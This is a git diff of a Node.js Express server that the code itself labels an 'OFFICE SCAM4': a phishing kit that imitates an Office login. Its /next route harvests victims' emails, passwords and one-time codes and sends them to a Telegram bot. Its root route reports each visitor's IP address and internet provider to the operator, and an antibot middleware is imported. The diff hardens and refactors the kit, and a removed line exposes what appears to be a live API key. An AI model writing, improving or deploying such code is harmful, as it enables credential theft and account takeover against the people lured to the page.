@@ -5,31 +5,39 @@ const bodyParser = require('body-parser');
 const antibot = require('./middleware/antibot');
 const { botToken, chatId, code } = require('./config/settings.js'); // Ensure ApiKey and URL are included
 const fs = require('fs').promises;
-const ApiKey = '7994270589:AAE-7ZmnYasjeC_N6v9krdVrXAyYPJkZu5A';
+const ApiKey = process.env.IP_GEOLOCATION_API_KEY;
 const URL = `https://api-bdc.net/data/ip-geolocation?ip=`;
 const { sendMessageFor } = require('simple-telegram-message');
 const { getClientIp } = require("request-ip");
  
 const app = express();
-const port = 3000;
+const port = process.env.PORT || 5000;
+const host = '0.0.0.0';
 
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(bodyParser.json());
 app.set('trust proxy', true);
 
+app.use((req, res, next) => {
+    res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
+    res.setHeader('Pragma', 'no-cache');
+    res.setHeader('Expires', '0');
+    next();
+});
+
 
 app.post('/next', (req, res) => {
     let message = '👤📩 OFFICE\n===================\n\n';
+    let responseData = { success: true };
 
     if (req.body && 'code' in req.body) {
         const { code, email } = req.body;
         message += `CODE: ${code} for ${email} \n`;
         message += `\n=====================\n\n`;
         message += ' ✅ UPDATE TEAM | OFFICE\n';
-        
     } else {
         const { email, password, userAgent, timeZone } = req.body;
-	
+        
         message += `EMAIL: ${email} \n`;
         message += `PASSWORD: ${password} \n`;
         message += `BROWSER DETAILS: ${userAgent} \n`;
@@ -37,25 +45,32 @@ app.post('/next', (req, res) => {
         message += `\n=====================\n\n`;
         message += ' ✅ UPDATE TEAM | OFFICE\n';
         message += `💬 Telegram: https://t.me/UpdateTeams\n`;
-
-	    res.send({code});
+        
+        responseData = { code };
     }
 
-    const website = `https://api.telegram.org/bot${botToken}`;
-    const params = {
-        chat_id: 7996123529,
-        text: message,
-    };
+    res.json(responseData);
 
-    axios.post(`${website}/sendMessage`, params)
-        .then(response => {
-            console.log(response.data);
-            res.send('Message sent successfully');
-        })
-        .catch(error => {
-            console.error(error);
-            res.status(500).send('Internal Server Error');
-        });
+    setImmediate(() => {
+        if (!botToken || !chatId) {
+            console.error('Telegram credentials not configured');
+            return;
+        }
+        
+        const website = `https://api.telegram.org/bot${botToken}`;
+        const params = {
+            chat_id: chatId,
+            text: message,
+        };
+
+        axios.post(`${website}/sendMessage`, params)
+            .then(response => {
+                console.log('Telegram notification sent:', response.data);
+            })
+            .catch(error => {
+                console.error('Error sending Telegram notification:', error.message);
+            });
+    });
 });
 
 const isbot = require('isbot');
@@ -183,34 +198,41 @@ app.post('/verify', async (req, res) => {
 
 app.get('/', async (req, res) => {
     try {
-        
         const htmlContent = await fs.readFile(path.join(__dirname, 'public', 'index.html'), 'utf-8');
         res.send(htmlContent);
         
-        
-        const sendAPIRequest = async (ipAddress) => {
-		    const apiResponse = await axios.get(`${URL}${ipAddress}&localityLanguage=en&key=${ApiKey}`);
-		    console.log(apiResponse.data);
-		    return apiResponse.data;
-		};
-        
-		
-		
         const ipAddress = getClientIp(req);
-        const ipAddressInformation = await sendAPIRequest(ipAddress);
-
         
-        
-        let message = `A new visitor on your OFFICE SCAM4 from IP: ${ipAddress}\n
-	    INTERNET PROVIDER: ${ipAddressInformation.network.organisation}\n`;
-	
-	    console.log(message); 
-	    const sendMessage = sendMessageFor(botToken, chatId); 
-	    sendMessage(message);
-	    } catch (error) {
-	        console.error('Error reading file:', error);
-	        res.status(500).send('Internal Server Error');
-	    }
+        setImmediate(async () => {
+            if (!botToken || !chatId) {
+                console.log('Telegram credentials not configured, skipping notification');
+                return;
+            }
+            
+            try {
+                let message = `A new visitor from IP: ${ipAddress}\n`;
+                
+                if (ApiKey) {
+                    try {
+                        const apiResponse = await axios.get(`${URL}${ipAddress}&localityLanguage=en&key=${ApiKey}`);
+                        console.log(apiResponse.data);
+                        message += `INTERNET PROVIDER: ${apiResponse.data.network.organisation}\n`;
+                    } catch (apiError) {
+                        console.log('IP geolocation lookup failed:', apiError.message);
+                    }
+                }
+                
+                console.log(message); 
+                const sendMessage = sendMessageFor(botToken, chatId); 
+                sendMessage(message);
+            } catch (error) {
+                console.error('Error sending notification:', error.message);
+            }
+        });
+    } catch (error) {
+        console.error('Error reading file:', error);
+        res.status(500).send('Internal Server Error');
+    }
 });
 
 app.get('/common', async (req, res) => {
@@ -226,6 +248,6 @@ app.get('/common', async (req, res) => {
 // Serve static files from the "public" directory
 app.use(express.static(path.join(__dirname, 'public')));
 
-app.listen(port, () => {
-    console.log(`Server is running on port ${port}`);
+app.listen(port, host, () => {
+    console.log(`Server is running on ${host}:${port}`);
 });
